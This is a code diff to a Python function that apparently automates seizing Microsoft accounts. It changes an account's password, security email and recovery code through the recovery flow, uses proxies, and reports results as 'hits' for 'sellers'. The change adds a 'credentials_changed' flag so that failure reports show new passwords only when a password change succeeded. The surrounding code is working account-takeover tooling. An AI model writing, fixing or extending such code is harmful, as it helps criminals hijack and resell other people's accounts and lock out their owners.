@@ -194,19 +194,36 @@ def _failure_result(
     recovery_code: str | None = None,
     error: str | None = None,
     fallback_otp: bool = False,
+    credentials_changed: bool = False,
 ) -> dict:
-    ms = {
-        "security_email": security_email or "Couldn't Change!",
-        "password": password or "Couldn't Change!",
-        "recovery_code": recovery_code or "Couldn't Change!",
-    }
+    # Only surface generated password/security email when RecoverUser actually succeeded
+    # (or a later step failed after password change). Otherwise they mislead sellers.
+    if credentials_changed:
+        ms = {
+            "security_email": security_email or "Couldn't Change!",
+            "password": password or "Couldn't Change!",
+            "recovery_code": recovery_code or "Couldn't Change!",
+        }
+    else:
+        ms = {
+            "security_email": "Couldn't Change!",
+            "password": "Couldn't Change!",
+            "recovery_code": recovery_code or "Couldn't Change!",
+        }
     detail = error or reason
     return {
         "failed": True,
         "reason": reason,
         "error": detail,
         "fallback_otp": fallback_otp,
-        "hit_embed": build_failure_embed(email, ms, reason, error=detail),
+        "credentials_changed": credentials_changed,
+        "hit_embed": build_failure_embed(
+            email,
+            ms,
+            reason,
+            error=detail,
+            credentials_changed=credentials_changed,
+        ),
     }
 
 
@@ -315,20 +332,20 @@ async def recovery_secure(
                     return _failure_result(
                         email,
                         exc.reason,
-                        security_email=security_email,
-                        password=password,
+                        security_email=security_email if exc.credentials_changed else None,
+                        password=password if exc.credentials_changed else None,
                         recovery_code=data.get("recovery_code"),
                         error=exc.reason,
+                        credentials_changed=exc.credentials_changed,
                     )
                 except Exception as exc:
                     if is_proxy_transport_error(exc):
                         return _failure_result(
                             email,
                             f"Network error during recovery ({exc.__class__.__name__}). Retry the account.",
-                            security_email=security_email,
-                            password=password,
                             recovery_code=data.get("recovery_code"),
                             error=str(exc) or exc.__class__.__name__,
+                            credentials_changed=False,
                         )
                     raise
 
@@ -336,10 +353,9 @@ async def recovery_secure(
                     return _failure_result(
                         email,
                         "Recovery failed — Microsoft did not return a new recovery code.",
-                        security_email=security_email,
-                        password=password,
                         recovery_code=data.get("recovery_code"),
                         error="recover() returned empty/invalid",
+                        credentials_changed=False,
                     )
 
                 print("[+] - Changed password and recovery code")
@@ -471,6 +487,7 @@ async def recovery_secure(
                                 security_email=security_email,
                                 password=password,
                                 recovery_code=new_recovery_code,
+                                credentials_changed=True,
                             )
 
                         print(f"[~] - Getting email code...")
@@ -485,6 +502,7 @@ async def recovery_secure(
                                 security_email=security_email,
                                 password=password,
                                 recovery_code=new_recovery_code,
+                                credentials_changed=True,
                             )
 
                         live = await livedata(s)
@@ -524,6 +542,7 @@ async def recovery_secure(
                                 password=password,
                                 recovery_code=new_recovery_code,
                                 error=str(exc) or exc.__class__.__name__,
+                                credentials_changed=True,
                             )
                         raise
 
@@ -535,6 +554,7 @@ async def recovery_secure(
                         password=password,
                         recovery_code=new_recovery_code,
                         error=account.get("reason"),
+                        credentials_changed=True,
                     )
 
                 if not account:
@@ -545,6 +565,7 @@ async def recovery_secure(
                         password=password,
                         recovery_code=new_recovery_code,
                         error="startSecuringAccount returned no account data.",
+                        credentials_changed=True,
                     )
 
                 return account
@@ -581,6 +602,7 @@ async def recovery_secure(
                         password=password,
                         recovery_code=new_recovery_code,
                         error=f"{exc.__class__.__name__}: {exc}",
+                        credentials_changed=True,
                     )
                 raise
             finally:
